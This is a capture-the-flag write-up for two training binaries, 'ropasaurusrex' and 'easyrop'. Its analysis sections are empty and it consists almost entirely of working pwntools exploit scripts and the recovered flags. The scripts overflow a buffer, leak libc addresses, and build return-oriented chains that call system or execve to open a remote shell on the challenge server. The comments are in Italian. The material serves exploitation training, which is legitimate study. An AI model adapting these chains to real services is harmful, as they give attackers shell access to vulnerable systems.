# ropasaurusrex ![c](https://img.shields.io/badge/solved-success)
### Analysis
### Exploit
```python
from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']
r = remote("training.jinblack.it", 2014)
#input("wait")


# AAAA
# write 
# gadget 
# arg 1 
# arg 2
# Arg 3
#  <- SP

write = 0x0804830c
arg1 = 1
arg2 = 0x08049614
arg3 = 4

pop3 = 0x080484b6

payload = p32(write) + p32(pop3) + p32(arg1) + p32(arg2) + p32(arg3) + p32(0x80483f4)

r.send(b"A"*140 + payload)

write_got = u32(r.recv(4))
libc_base = write_got - 0xe6d80
system = libc_base + 0x3d200
binsh = libc_base + 0x17e0cf
print("[!] write_got: 0x%08x" % write_got)
print("[!] libc_base: 0x%08x" % libc_base)
print("[!] system: 0x%08x" % system)
print("[!] binsh: 0x%08x" % binsh)

time.sleep(0.1)

payload2 = p32(system) + b"BBBB" + p32(binsh)


r.send(b"A"*140 + payload2)

r.interactive()
```

Flag: **flag{roar_rop_wierd_machines_are_lovely_like_a_trex!}**

# easyrop ![c](https://img.shields.io/badge/solved-success)
### Analysis
### Exploit
```python
from pwn import *
import time

context.terminal = ['terminator', '-e']
r = remote("training.jinblack.it", 2015)
'''
r = process("./easyrop")
gdb.attach(r, """
	c
	""")
#input("wait")
'''
def write64(address):
	zero = "\x00\x00\x00\x00"
	bytes = p64(address)
	r.send(bytes[0:4])
	r.send(zero)	
	r.send(bytes[4:8])
	r.send(zero)
	time.sleep(0.1)
	return

pop3_gadget = 0x4001c2
sys_gadget = 0x4001b3
add = 0x60037c

padding = b"AAAA" * 24

r.send(padding)		#INSERISCO PADDING PER RIUSCIRE A SOVRASCRIVERE IL TUTTO (butto dentro delle A)
write64(add)		#SOVRASCRIVO RBP CON UN INDIRIZZO VALIDO

#WRITE CHAIN - w
w1 = 0
w2 = 0x600370
w3 = 8
w4 = 0
write64(pop3_gadget)	#INDIRIZZO POP3 GADGET (ROPgadget)
write64(w1)		#FILE DESCRIPTOR (0 in RDI)
write64(w2)		#INDIRIZZO BUFFER DEST (0x600370 in RSI, è l'indirizzo di len)
write64(w3)		#NUMERO BYTES (16 in RDX)
write64(w4)		#ID READ (0 in RAX)
write64(sys_gadget)	#INDIRIZZO SYSCALL GADGET (BO????)
write64(add)		#AGAIN

#EXECV CHAIN - e
e1 = 0x600370
e2 = 0
e3 = 0
e4 = 0x3b
write64(pop3_gadget)
write64(e1)
write64(e2)
write64(e3)
write64(e4)
write64(sys_gadget)
write64(add)		#AGAIN


#ORA DEVO USCIRE DAL LOOP DEL MAIN, BUTTO DUE \n PER FAILARE IL CONTROLLO E USCIRE, POI MANDO IL CONTENUTO
#DELLA READ CHE VERRÀ ESEGUITA GRAZIE ALLA ROP CHAIN

#ESCO
r.send("\n")
time.sleep(0.1)
r.send("\n")
time.sleep(0.1)

#INPUT DELLA READ
r.send(b"/bin/sh\x00")

r.interactive()

```

Flag: **flag{64bit_rop_it_is_even_easier_than_32!}**
